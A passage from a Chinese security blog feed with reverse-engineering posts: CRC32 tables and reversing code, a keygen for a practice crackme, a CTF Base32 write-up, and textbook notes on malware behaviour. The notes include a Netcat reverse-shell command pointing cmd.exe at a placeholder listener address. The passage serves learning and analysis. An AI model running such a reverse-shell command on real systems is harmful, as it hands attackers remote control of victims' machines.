class="line">  28h   35B5A8FA 42B2986C DBBBC9D6 ACBCF940</span><br><span class="line">  2Ch   32D86CE3 45DF5C75 DCD60DCF ABD13D59</span><br><span class="line"></span><br><span class="line">  30h   26D930AC 51DE003A C8D75180 BFD06116</span><br><span class="line">  34h   21B4F4B5 56B3C423 CFBA9599 B8BDA50F</span><br><span class="line">  38h   2802B89E 5F058808 C60CD9B2 B10BE924</span><br><span class="line">  3Ch   2F6F7C87 58684C11 C1611DAB B6662D3D</span><br><span class="line"></span><br><span class="line">  40h   76DC4190 01DB7106 98D220BC EFD5102A</span><br><span class="line">  44h   71B18589 06B6B51F 9FBFE4A5 E8B8D433</span><br><span class="line">  48h   7807C9A2 0F00F934 9609A88E E10E9818</span><br><span class="line">  4Ch   7F6A0DBB 086D3D2D 91646C97 E6635C01</span><br><span class="line"></span><br><span class="line">  50h   6B6B51F4 1C6C6162 856530D8 F262004E</span><br><span class="line">  54h   6C0695ED 1B01A57B 8208F4C1 F50FC457</span><br><span class="line">  58h   65B0D9C6 12B7E950 8BBEB8EA FCB9887C</span><br><span class="line">  5Ch   62DD1DDF 15DA2D49 8CD37CF3 FBD44C65</span><br><span class="line"></span><br><span class="line">  60h   4DB26158 3AB551CE A3BC0074 D4BB30E2</span><br><span class="line">  64h   4ADFA541 3DD895D7 A4D1C46D D3D6F4FB</span><br><span class="line">  68h   4369E96A 346ED9FC AD678846 DA60B8D0</span><br><span class="line">  6Ch   44042D73 33031DE5 AA0A4C5F DD0D7CC9</span><br><span class="line"></span><br><span class="line">  70h   5005713C 270241AA BE0B1010 C90C2086</span><br><span class="line">  74h   5768B525 206F85B3 B966D409 CE61E49F</span><br><span class="line">  78h   5EDEF90E 29D9C998 B0D09822 C7D7A8B4</span><br><span class="line">  7Ch   59B33D17 2EB40D81 B7BD5C3B C0BA6CAD</span><br><span class="line"></span><br><span class="line">  80h   EDB88320 9ABFB3B6 03B6E20C 74B1D29A</span><br><span class="line">  84h   EAD54739 9DD277AF 04DB2615 73DC1683</span><br><span class="line">  88h   E3630B12 94643B84 0D6D6A3E 7A6A5AA8</span><br><span class="line">  8Ch   E40ECF0B 9309FF9D 0A00AE27 7D079EB1</span><br><span class="line"></span><br><span class="line">  90h   F00F9344 8708A3D2 1E01F268 6906C2FE</span><br><span class="line">  94h   F762575D 806567CB 196C3671 6E6B06E7</span><br><span class="line">  98h   FED41B76 89D32BE0 10DA7A5A 67DD4ACC</span><br><span class="line">  9Ch   F9B9DF6F 8EBEEFF9 17B7BE43 60B08ED5</span><br><span class="line"></span><br><span class="line">  A0h   D6D6A3E8 A1D1937E 38D8C2C4 4FDFF252</span><br><span class="line">  A4h   D1BB67F1 A6BC5767 3FB506DD 48B2364B</span><br><span class="line">  A8h   D80D2BDA AF0A1B4C 36034AF6 41047A60</span><br><span class="line">  ACh   DF60EFC3 A867DF55 316E8EEF 4669BE79</span><br><span class="line"></span><br><span class="line">  B0h   CB61B38C BC66831A 256FD2A0 5268E236</span><br><span class="line">  B4h   CC0C7795 BB0B4703 220216B9 5505262F</span><br><span class="line">  B8h   C5BA3BBE B2BD0B28 2BB45A92 5CB36A04</span><br><span class="line">  BCh   C2D7FFA7 B5D0CF31 2CD99E8B 5BDEAE1D</span><br><span class="line"></span><br><span class="line">  C0h   9B64C2B0 EC63F226 756AA39C 026D930A</span><br><span class="line">  C4h   9C0906A9 EB0E363F 72076785 05005713</span><br><span class="line">  C8h   95BF4A82 E2B87A14 7BB12BAE 0CB61B38</span><br><span class="line">  CCh   92D28E9B E5D5BE0D 7CDCEFB7 0BDBDF21</span><br><span class="line"></span><br><span class="line">  D0h   86D3D2D4 F1D4E242 68DDB3F8 1FDA836E</span><br><span class="line">  D4h   81BE16CD F6B9265B 6FB077E1 18B74777</span><br><span class="line">  D8h   88085AE6 FF0F6A70 66063BCA 11010B5C</span><br><span class="line">  DCh   8F659EFF F862AE69 616BFFD3 166CCF45</span><br><span class="line"></span><br><span class="line">  E0h   A00AE278 D70DD2EE 4E048354 3903B3C2</span><br><span class="line">  E4h   A7672661 D06016F7 4969474D 3E6E77DB</span><br><span class="line">  E8h   AED16A4A D9D65ADC 40DF0B66 37D83BF0</span><br><span class="line">  ECh   A9BCAE53 DEBB9EC5 47B2CF7F 30B5FFE9</span><br><span class="line"></span><br><span class="line">  F0h   BDBDF21C CABAC28A 53B39330 24B4A3A6</span><br><span class="line">  F4h   BAD03605 CDD70693 54DE5729 23D967BF</span><br><span class="line">  F8h   B3667A2E C4614AB8 5D681B02 2A6F2B94</span><br><span class="line">  FCh   B40BBE37 C30C8EA1 5A05DF1B 2D02EF8D</span><br></pre></td></tr></table></figure><h2 id="CRC32逆向实例分析"><a href="#CRC32逆向实例分析" class="headerlink" title="CRC32逆向实例分析"></a>CRC32逆向实例分析</h2><p><img src="https://i.loli.net/2018/08/16/5b758eff9d88b.jpg" alt=""></p><p>要求输入name和code，拖入IDA查看<br>查找字符串，来到算法位置</p><p><img src="https://i.loli.net/2018/08/16/5b758fe0ba199.jpg" alt=""></p><p>name存放到v3，code存放到v8<br>首先要求name字符数大于等于5<br>sub_402F1C将DiKeN附加到输入的name前</p><p><img src="https://i.loli.net/2018/08/16/5b75955a6c465.jpg" alt=""></p><p>sub_402ED0计算拼接后字符串长度<br>sub_403DF0是CRC32计算部分</p><p><img src="https://i.loli.net/2018/08/16/5b759975b94c4.jpg" alt=""></p><p>table如下</p><p><img src="https://i.loli.net/2018/08/16/5b759a7bb849d.jpg" alt=""></p><p>可以看到与CRC32相同，由此确定为CRC32加密</p><p>code部分则是将字符0加到code前，然后将其每个字符-30h，转换为数字，最后name与code异或校验。<br>这里着重谈逆向时的要点，具体分析请参考这篇文章 <a href="https://bbs.ichunqiu.com/thread-30717-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-30717-1-1.html</a></p><h2 id="魔改CRC分析方法"><a href="#魔改CRC分析方法" class="headerlink" title="魔改CRC分析方法"></a>魔改CRC分析方法</h2><p>首先还是要对标准CRC算法有一些了解。<br>能够修改的部分其实很少，感觉一般会修改生成多项式或修改数据表</p><ol><li><p>对于修改生成多项式，我们需要自己生成数据表，参照脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int make_crc32_table()  </span><br><span class="line">&#123;  </span><br><span class="line">    unsigned c;  </span><br><span class="line">    int i = 0;  </span><br><span class="line">    int bit = 0;  </span><br><span class="line">    for(i = 0; i &lt; 256; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        c  = (unsigned)i;      </span><br><span class="line">        for(bit = 0; bit &lt; 8; bit++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            if(c&amp;1)  </span><br><span class="line">            &#123;  </span><br><span class="line">                c = (c &gt;&gt; 1)^(0xEDB88320);  //生成多项式自行修改</span><br><span class="line">                 </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123;  </span><br><span class="line">                c =  c &gt;&gt; 1;  </span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;  </span><br><span class="line">        crc32_table = c; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于修改数据表，应该只能通过与常用表进行对照了</p></li></ol><h2 id="CRC32发送端接收端完整校验验证性程序"><a href="#CRC32发送端接收端完整校验验证性程序" class="headerlink" title="CRC32发送端接收端完整校验验证性程序"></a>CRC32发送端接收端完整校验验证性程序</h2><p>发送端发送数据后显示CRC32加密密文，接收端解码返回0证明校验成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">#define POLY 0x04C11DB7L // CRC32生成多项式  </span><br><span class="line"></span><br><span class="line">unsigned int CRC32INV(char * data, int length) //接收端</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char* p = new unsigned char[length];</span><br><span class="line">        memcpy(p, data, length);</span><br><span class="line">        unsigned int reg = 0, sum_poly = 0;</span><br><span class="line">        for (int i = 0; i &lt; length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sum_poly = reg &amp; 0xFF000000;</span><br><span class="line">                for (int j = 0; j &lt; 8; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        int hi = sum_poly &amp; 0x80000000;</span><br><span class="line">                        sum_poly &lt;&lt;= 1;</span><br><span class="line">                        if (hi) sum_poly = sum_poly ^ POLY;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                reg = (reg &lt;&lt; 8) | p[i];</span><br><span class="line">                reg = reg ^ sum_poly;</span><br><span class="line">        &#125;</span><br><span class="line">        return reg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int CRC32(char * data, int length) //发送端</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char* p = new unsigned char[length + 4];</span><br><span class="line">        memset(p, 0, length + 4);</span><br><span class="line">        memcpy(p, data, length);</span><br><span class="line">        unsigned int reg = 0, sum_poly = 0;</span><br><span class="line">        for (int i = 0; i &lt; length + 4; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sum_poly = reg &amp; 0xFF000000;</span><br><span class="line">                for (int j = 0; j &lt; 8; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        int hi = sum_poly &amp; 0x80000000;</span><br><span class="line">                        sum_poly &lt;&lt;= 1;</span><br><span class="line">                        if (hi) sum_poly = sum_poly ^ POLY;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                reg = (reg &lt;&lt; 8) | p[i];</span><br><span class="line">                reg = reg ^ sum_poly;</span><br><span class="line">        &#125;</span><br><span class="line">        return reg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        char *crcin = new char[5];</span><br><span class="line">        crcin[0] = &apos;1&apos;;</span><br><span class="line">        crcin[1] = &apos;2&apos;;</span><br><span class="line">        crcin[2] = &apos;3&apos;;</span><br><span class="line">        crcin[3] = &apos;4&apos;;</span><br><span class="line">        crcin[4] = &apos;\0&apos;;</span><br><span class="line">        unsigned int crcout = CRC32(crcin, 4);</span><br><span class="line">        char *crcinvin = new char[9];</span><br><span class="line">        memcpy(crcinvin, crcin, 4);</span><br><span class="line">        delete[] crcin;</span><br><span class="line">        for (int i = 0; i&lt;4; i++)</span><br><span class="line">                memcpy(crcinvin + i + 4, (char*)&amp;crcout + 3 - i, 1);</span><br><span class="line">        crcinvin[8] = &apos;\0&apos;;</span><br><span class="line">        unsigned int crcinvout = CRC32INV(crcinvin, 8);</span><br><span class="line">        cout &lt;&lt; &quot;crc&quot; &lt;&lt; crcout &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;crc&quot; &lt;&lt; crcinvout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/08/17/5b767581d0468.png" alt=""></p><hr><p>目前想到的就先这些<br>参考链接：<br><a href="https://www.cnblogs.com/dacainiao/p/5565046.html" target="_blank" rel="noopener">https://www.cnblogs.com/dacainiao/p/5565046.html</a><br><a href="http://wdhdmx.iteye.com/blog/1464269" target="_blank" rel="noopener">http://wdhdmx.iteye.com/blog/1464269</a><br><a href="https://blog.csdn.net/qq446252221/article/details/51426434" target="_blank" rel="noopener">https://blog.csdn.net/qq446252221/article/details/51426434</a><br><a href="https://blog.csdn.net/wave_1102/article/details/2184901" target="_blank" rel="noopener">https://blog.csdn.net/wave_1102/article/details/2184901</a><br><a href="https://bbs.ichunqiu.com/thread-30717-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-30717-1-1.html</a><br><a href="https://blog.csdn.net/android_lover2014/article/details/78260884" target="_blank" rel="noopener">https://blog.csdn.net/android_lover2014/article/details/78260884</a><br><a href="https://bbs.pediy.com/thread-30975.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-30975.htm</a><br><a href="https://blog.csdn.net/sparkliang/article/details/5671510" target="_blank" rel="noopener">https://blog.csdn.net/sparkliang/article/details/5671510</a></p><p>End。。</p><p>From <a href="https://kabeor.github.io/CRC校验算法及逆向方法初探/">https://kabeor.github.io/CRC校验算法及逆向方法初探/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CRC校验算法及逆向方法初探&quot;&gt;&lt;a href=&quot;#CRC校验算法及逆向方法初探&quot; class=&quot;headerlink&quot; title=&quot;CRC校验算法及逆向方法初探&quot;&gt;&lt;/a&gt;CRC校验算法及逆向方法初探&lt;/h1&gt;&lt;h2 id=&quot;循环冗余校验（Cyclic-red
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，CRC加密" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8CCRC%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>001_Acid_burn.exe 算法分析</title>
    <link href="https://kabeor.github.io/001_Acid_burn.exe%20%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/001_Acid_burn.exe 算法分析/</id>
    <published>2018-08-03T03:55:16.879Z</published>
    <updated>2018-08-03T03:57:03.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="001-Acid-burn-exe-算法分析"><a href="#001-Acid-burn-exe-算法分析" class="headerlink" title="001_Acid_burn.exe 算法分析"></a>001_Acid_burn.exe 算法分析</h1><p>爆破的方法是好几个月以前写的了<br><a href="https://kabeor.cn/001_Acid_burn.exe/" target="_blank" rel="noopener">001_Acid_burn.exe</a></p><p>今天来看一下算法</p><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><p>直接在OD中分析此分支，找到跳转判断条件<br><img src="https://i.loli.net/2018/08/03/5b63ce2dba2af.jpg" alt=""></p><p>函数004039FC内将输入字符串与“Hello Dude!”进行比较<br>即密码就是 Hello Dude!</p><h2 id="Name-Serial"><a href="#Name-Serial" class="headerlink" title="Name+Serial"></a>Name+Serial</h2><p><img src="https://i.loli.net/2018/08/03/5b63cfafaf959.jpg" alt=""></p><p>整个结构很清晰，name长度必须大于等于4，然后进入算法判断</p><p><img src="https://i.loli.net/2018/08/03/5b63d010b8bc7.jpg" alt=""></p><p><img src="https://i.loli.net/2018/08/03/5b63d04f4f6a7.jpg" alt=""></p><p>如图注释<br>首先注意dword_431750被赋值为<strong>0x29</strong><br>然后直接看第二层验证<br>*v18是输入name的第一个字符name[0]</p><p>经过如下计算<br><code>name[0]*0x29*2</code><br>并将其转换为十进制，然后填入( )中组合成密码</p><pre><code>CW-( )-CRACKED</code></pre><h2 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char name[1024];</span><br><span class="line"></span><br><span class="line">    printf(&quot;Input your name: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, name);</span><br><span class="line">    printf(&quot;Serial: CW-%d-CRACKED\n&quot;, name[0] * 0x29 * 2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>END..</p><p>From <a href="https://kabeor.github.io/001_Acid_burn.exe 算法分析/">https://kabeor.github.io/001_Acid_burn.exe 算法分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;001-Acid-burn-exe-算法分析&quot;&gt;&lt;a href=&quot;#001-Acid-burn-exe-算法分析&quot; class=&quot;headerlink&quot; title=&quot;001_Acid_burn.exe 算法分析&quot;&gt;&lt;/a&gt;001_Acid_burn.exe 算法
      
    
    </summary>
    
    
      <category term="逆向，160个crackme" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C160%E4%B8%AAcrackme/"/>
    
  </entry>
  
  <entry>
    <title>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</title>
    <link href="https://kabeor.github.io/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/"/>
    <id>https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N/</id>
    <published>2018-07-24T02:20:15.634Z</published>
    <updated>2018-07-24T04:38:49.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N"><a href="#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N" class="headerlink" title="2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N"></a>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</h1><p>通过这道题，又复习了一遍Base32的逆向<br><img src="https://i.loli.net/2018/07/24/5b568e0e2376c.png" alt="im"></p><p>很干净，无壳无花，x86 C++</p><p>拖进IDA</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>搜索字符串<br><img src="https://i.loli.net/2018/07/24/5b568eef447cf.jpg" alt="enter description here"></p><p>定位，F5<br><img src="https://i.loli.net/2018/07/24/5b568f58c6d73.jpg" alt="im"><br><img src="https://i.loli.net/2018/07/24/5b568f94111d0.jpg" alt="im"></p><p>首先要求输入长度大于等于10</p><h3 id="1-Fake-Flag"><a href="#1-Fake-Flag" class="headerlink" title="1. Fake Flag"></a>1. Fake Flag</h3><p><code>v3 = &quot;guvf_vf_n_snxr_synt&quot;;</code>是用来骗人的，其操作是在sub_401100进行操作然后比较，因此只要利用逆向思维，将v3看作已知，对sub_401100进行逆操作即可</p><p>sub_401100内部为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed int __thiscall sub_401100(const char *this)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v1; // edi</span><br><span class="line">  unsigned int v2; // esi</span><br><span class="line">  char v3; // cl</span><br><span class="line"></span><br><span class="line">  v1 = this;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  if ( strlen(this) )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v1[v2];</span><br><span class="line">      if ( (unsigned __int8)(v3 - 97) &lt;= 0x19u )</span><br><span class="line">        v1[v2] = (v3 - 84) % 26 + 97;</span><br><span class="line">      if ( (unsigned __int8)(v3 - 65) &lt;= 0x19u )</span><br><span class="line">        v1[v2] = (v3 - 52) % 26 + 65;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v2 &lt; strlen(v1) );</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出是对ASCII操作<br>    84  -&gt; ‘T’<br>    97  -&gt; ‘a’<br>    52 -&gt; ‘4’<br>    65 -&gt; ‘A’</p><blockquote><p>脚本</p></blockquote><p><img src="https://i.loli.net/2018/07/24/5b569646a3664.jpg" alt="im"></p><p>当然了，这是假flag，仅供娱乐</p><h3 id="True-Flag"><a href="#True-Flag" class="headerlink" title="True Flag"></a>True Flag</h3><p>接着往下看<br><strong>LABEL_9</strong>才是真正的加解密函数</p><h4 id="编码表-sub-4012C0"><a href="#编码表-sub-4012C0" class="headerlink" title="编码表 sub_4012C0()"></a>编码表 sub_4012C0()</h4><p>进入<code>sub_4012C0();</code>查看<br><img src="https://i.loli.net/2018/07/24/5b56985dd2937.jpg" alt="enter description here"></p><p><code>sub_401100</code>刚刚分析过，这里仔细分析一下<br><img src="https://i.loli.net/2018/07/24/5b5699d86e2f5.jpg" alt="i"></p><p>接下来读取长度，<strong>+32</strong>是大写转换为小写操作<strong>，</strong>++i<strong> 及 </strong>i&amp;1**组合表示奇数位不变，偶数位转换</p><p><code>dword_40507C</code>内容需要括住按C键重新分析，将数据识别为Char类型，结果如下<br><img src="https://i.loli.net/2018/07/24/5b569c5e93812.jpg" alt="enter description here"></p><p>‘2765’及‘43’也是转换成char类型得到的，值得注意的是，未转换之前为十六进制编码，且应倒序读取，<code>dword_40507C</code>加上4位数字(即5672)就来到了<code>word_405080</code>,也就是数字顺序为<strong>567234</strong><br>或着在修复<code>dword_40507C</code>后，重新F5，即如下图，更加易于理解<br><img src="https://i.loli.net/2018/07/24/5b569ea6d5852.jpg" alt="enter description here"></p><p>于是将<strong>ABCDEFGHIJKLMNOPQRSTUVWXYZ</strong>带入脚本得出<br><img src="https://i.loli.net/2018/07/24/5b569f8908552.jpg" alt="enter description here"><br>再替换大小写，后面加567234即得出编码顺序<br><strong><em>NoPqRsTuVwXyZaBcDeFgHiJkLm567234</em></strong></p><h4 id="BASE32-sub-401310"><a href="#BASE32-sub-401310" class="headerlink" title="BASE32 sub_401310()"></a>BASE32 sub_401310()</h4><p>回到主函数，分析最后一个需要的函数<code>sub_401310()</code><br><img src="https://i.loli.net/2018/07/24/5b56a0f209578.jpg" alt="enter description here"></p><p>跟进<code>sub_401170</code><br><img src="https://i.loli.net/2018/07/24/5b56a1524a1c1.jpg" alt="enter description here"><br><img src="https://i.loli.net/2018/07/24/5b56a175578ae.jpg" alt="enter description here"></p><p>下面case里的数据识别为char为”=”,结合题目叫Simple Base-N可以猜到应该是Base16/32/64类型的加密，并且编码表的内容我们也刚刚已经得出，为了继续印证猜想，往上看看，发现如下操作<br><img src="https://i.loli.net/2018/07/24/5b56a26b97f72.jpg" alt="enter description here"></p><p>这看起来很眼熟，<img src="https://i.loli.net/2018/07/24/5b56a3075ac53.jpg" alt="enter description here"></p><p>之前写过一篇wp(<a href="https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/" target="_blank" rel="noopener">2017第二届广东省强网杯线上赛Nonstandard</a>)，代码一模一样，看来就是Base32了。</p><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><p>于是直接用上次的脚本就好,带入密码<code>weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s = &quot;weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg&quot;</span><br><span class="line">table = &quot;NoPqRsTuVwXyZaBcDeFgHiJkLm567234&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x==&apos;=&apos;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)//8):</span><br><span class="line">    p = s[i*8:i*8+8]</span><br><span class="line">    t = 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t = t&lt;&lt;5</span><br><span class="line">        t += find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end=&apos;&apos;)</span><br><span class="line">        t = t&lt;&lt;8</span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><img src="https://i.loli.net/2018/07/24/5b56a42e4abd6.jpg" alt="enter description here"><br>得出之后提交并不正确，通过凯撒移位，发现Rot13的结果是flag<br><img src="https://i.loli.net/2018/07/24/5b56ad29a553f.jpg" alt="enter description here"></p><blockquote><p>flag：Y@u_Kn@W<em>b@s332</em>@Nd_r0t13</p></blockquote><hr><p>Get it！</p><p>From <a href="https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1">https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N/</a> Simple Base-N/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot;&gt;&lt;a href=&quot;#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot; class=&quot;headerlink&quot; title=&quot;2018巅峰极客网络安全技能挑战赛 RE
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，巅峰极客网络安全技能挑战赛，wp" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%8Cwp/"/>
    
  </entry>
  
  <entry>
    <title>第11章  恶意代码行为</title>
    <link href="https://kabeor.github.io/%E7%AC%AC11%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/"/>
    <id>https://kabeor.github.io/第11章  恶意代码行为/</id>
    <published>2018-07-23T02:39:10.596Z</published>
    <updated>2018-07-23T06:34:27.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第11章-恶意代码行为"><a href="#第11章-恶意代码行为" class="headerlink" title="第11章  恶意代码行为"></a>第11章  恶意代码行为</h1><h2 id="11x1-下载器和启动器"><a href="#11x1-下载器和启动器" class="headerlink" title="11x1 下载器和启动器"></a>11x1 下载器和启动器</h2><p>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用（exploit）打包在一起。下载器常用Windows API函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。</p><p>启动器（也称为加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码。启动器通常包含一个它要加载的恶意代码。</p><h2 id="11x2-后门（backdoor）"><a href="#11x2-后门（backdoor）" class="headerlink" title="11x2 后门（backdoor）"></a>11x2 后门（backdoor）</h2><p>后门（backdoor）是另一种类型的恶意代码，它能让攻击者远程访问一个受害的机器。后门是一种最常见的恶意代码，它们拥有多种功能，并且以多种形式与大小存在。后门代码往往实现了全套功能，所以当使用一个后门时，攻击者通常不需要下载额外的恶意代码。</p><p>后门程序利用互联网的通信方式是多样的，但是一个常用的方法是利用80端口使用HTTP协议。<br>HTTP是出站流量最常使用的协议，所以它为恶意代码提供了一个与其他流量混淆的好机会。</p><p>后门拥有一套通用的功能，例如操作注册表、列举窗口、创建目录、搜索文件，等等。查看后门使用和导入的Windows函数，可以确定后门程序实现的功能。</p><h3 id="1-反向shell"><a href="#1-反向shell" class="headerlink" title="1. 反向shell"></a>1. 反向shell</h3><p>反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限。反向shel或者作为一个单独的恶意代码存在，或者作为一个复杂后门程序中的组件而存在。在反向shell中，攻击者能够如同在本地系统上一样运行命令。</p><blockquote><p>Netcat反向shell</p></blockquote><p>可以通过在两台机器上运行Netcat，来创建一个反向shell。同时，攻击者已经知道在恶意代码中使用Netcat，或者和其他恶意程序一起打包使用。</p><p>Netcat被作为一个反向shell使用时，远程机器使用下列命令，等待入站连接。<br><code>nc -l -p 80</code><br>-1选项设置Netcat为监听模式，-p用来设置监听端口。接下来，受害机器向外连出，并且使用下列命令提供shell。<br><code>nc 1istener_ip 80 -e cmd.exe</code><br>Listener_ip 80是远程机器的IP地址和端口。-e选项用来指定连接建立后要运行的程序，并将这一程序标准输入和输出与套接字进行绑定。</p><blockquote><p>Windows反向shell</p></blockquote><p>使用cmd.exe作为Windows系统中的反向shell，有两种简单的恶意编码实现：基础方法和多线程技术。</p><p>基础方法在恶意代码编写者之间比较流行，因为它容易编写，且效果与多线程技术一致。它涉及CreateProcess函数的调用，并操纵传递给CreateProcess的STARTUPINFO结构。首先，创建一个套接字，并与远程服务器建立连接。然后，绑定这个套接字与cmd.exe标准流（标准输入、标准输出以及标准错误）。调用CreateProcess函数用隐藏窗口的方式创建cmd.exe程序，对受害者隐藏cmd.exe进程。</p><p>Windows反向shell的多线程版本涉及一个套接字、两个管道及两个线程的创建（查询API调用函数CreateThread、CreatePipe）。恶意代码有时将这种方法作为策略，来篡改或编码经过一个套接字传入或传出的数据。CreatePipe用来绑定一个管道的读写端，如标准输入（stdin）和标准输出（stdout）。CreateProcess方法用来绑定一个管道与标准流，而不是直接与套接字绑定。调用CreateProcess方法，恶意代码会产生两个线程：一个用来从标准输入管道读数据，并且向套接字写数据，另外一个用来从一个套接字读数据，并且向一个标准输出管道写数据。通常这两个线程使用数据编码来篡改数据。</p><h3 id="2-远程控制工具"><a href="#2-远程控制工具" class="headerlink" title="2. 远程控制工具"></a>2. 远程控制工具</h3><p>远程控制工具（RAT）被用来远程管理一台或多台计算机。远程控制工具经常为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p><p>服务器端运行在一个被植入恶意代码的受害主机上。客户端作为攻击者远程操纵运行命令和控制的单元。服务器端命令客户端开始一个连接，同时它们也被客户端控制。远程控制工具通常通过如80、443等常用的端口通信。</p><blockquote><p>远程控制工具的网络结构<br><img src="https://i.loli.net/2018/07/23/5b55432e2760f.jpg" alt="i"></p><p>Poison lvy（ <a href="http://www.poisonivy-rat.com/" target="_blank" rel="noopener">http://www.poisonivy-rat.com/</a> ）（<a href="http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/" target="_blank" rel="noopener">http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/</a> 